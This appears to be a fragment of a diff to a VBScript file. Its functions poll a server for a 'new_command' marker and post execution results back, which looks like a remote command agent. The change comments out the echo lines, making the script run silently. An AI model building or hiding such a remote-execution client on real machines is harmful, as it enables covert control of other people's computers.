@@ -67,7 +67,7 @@ function poll()
 		objXmlHttpMain.send
 		resp=objXmlHttpMain.responseText
 		
-		WScript.echo resp
+		'WScript.echo resp
 		is_new=InStr(resp, "new_command")
 		if is_new <> 0 Then
 			'WScript.echo "Is new is present"
@@ -128,7 +128,7 @@ function push_and_exe(command,c_type)
 		'objXmlHttpMain.setRequestHeader "Content-Type", "application/json"
 		objXmlHttpMain.send strJSONToSend
 		resp=objXmlHttpMain.responseText
-		WScript.echo "post resp: " +resp
+		'WScript.echo "post resp: " +resp
 		set objJSONDoc = nothing 
 		set objResult = nothing
 	'Catch e As Exception
